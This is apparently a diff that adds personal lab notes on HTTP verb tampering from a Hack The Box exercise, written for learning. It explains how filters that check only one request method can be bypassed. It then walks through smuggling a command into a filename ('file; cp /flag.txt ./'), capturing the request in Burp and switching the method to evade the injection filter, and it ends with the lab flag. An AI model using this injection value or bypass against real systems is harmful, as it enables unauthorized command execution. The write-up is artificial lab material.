@@ -1,1 +1,30 @@
 
+The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter']), it may be possible to bypass it by simply changing the request method to GET.
+
+In the File Manager web application, if we try to create a new file name with special characters in its name (e.g. test;), we get the following message: 
+
+83.136.251.75:37643
+
+Question 1 - To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./
+
+1) 94.237.62.162:57678
+2) open burp 
+3) in file form type -> file; cp /flag.txt ./ and hit ENTER -> MAKE SURE BURP IS ENABLED
+4) intercept the GET request it should look like this -> 
+GET /index.php?filename=+file%3B+cp+%2Fflag.txt+.%2F HTTP/1.1
+Host: 94.237.62.162:57678
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.62.162:57678/
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+Now INSIDE PROXY right click the request and hit change request method. itll default change to POST which is fine. 
+
+5) hit forward. then go back and turn burp off on the browser and go back to root url of http://94.237.62.162:57678/index.php -> youll see flag.txt waiting, click it -> 
+HTB{b3_v3rb_c0n51573n7}
